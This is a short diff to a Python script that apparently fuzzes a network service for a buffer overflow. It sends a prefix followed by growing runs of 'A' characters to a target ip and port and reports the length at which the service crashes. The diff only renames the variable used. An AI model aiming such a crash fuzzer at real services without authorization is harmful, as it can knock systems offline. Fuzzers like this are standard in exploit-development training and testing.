@@ -20,15 +20,15 @@ for x in buffer:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
         connect = s.connect((ip, port))
-        print("Sending Payload... %s" % len(string))
-        s.send(prefix + string + "\r\n")
+        print("Sending Payload... %s" % len(x))
+        s.send(prefix + x + "\r\n")
         s.recv(1024)
         s.send("EXIT\r\n")
         s.recv(1024)
         s.close()
 
     except:
-        print("Crashed at {} ".format(len(string)))
+        print("Crashed at {} ".format(len(x)))
         sys.exit(0)
         x += 100 * "A"
     time.sleep(1)
